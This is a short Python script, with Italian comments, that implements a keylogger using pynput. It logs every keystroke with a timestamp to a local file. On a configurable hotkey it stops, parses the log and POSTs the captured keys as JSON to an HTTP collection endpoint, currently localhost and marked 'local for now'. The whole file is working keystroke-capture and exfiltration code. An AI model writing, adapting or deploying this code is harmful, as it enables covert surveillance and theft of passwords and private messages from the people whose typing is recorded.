import pynput.keyboard as keyboard
import datetime

from dotenv import load_dotenv
import os
load_dotenv()
env_key = os.getenv("HOT_KEY")

import requests


log_file = "logs/keylog.txt"
url = "http://127.0.0.1:3000/addlogs" #in locale per ora

def on_hotkey():
    print("stopping...")
    listener.stop()

    #in lista di tuple
    payload = []
    with open("logs/keylog.txt", "r") as f:
        for line in f:
            line = line.strip()

            if "=" not in line:
                continue

            key, value = line.split("=", 1)
            payload.append((key.strip(), value.strip()))


    response = requests.post(url, json=payload)

    print("Status Code:", response.status_code)
    print("Response JSON:", response.json()) #se po pure toglie


hotkey = keyboard.HotKey(
    keyboard.HotKey.parse(env_key), #when matched
    on_hotkey #execute (stop listener)
)


def on_press(key):
    hotkey.press(listener.canonical(key))
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        entry = f"{timestamp} = {key.char}"
    except:
        entry = f"{timestamp} = {key}"

    with open(log_file, "a") as f: #appende al file
        f.write(entry + "\n")

print("Keylogger running...")


def on_release(key):
    hotkey.release(listener.canonical(key))


listener = keyboard.Listener(on_press=on_press, 
                             on_release=on_release)
listener.start()
listener.join()


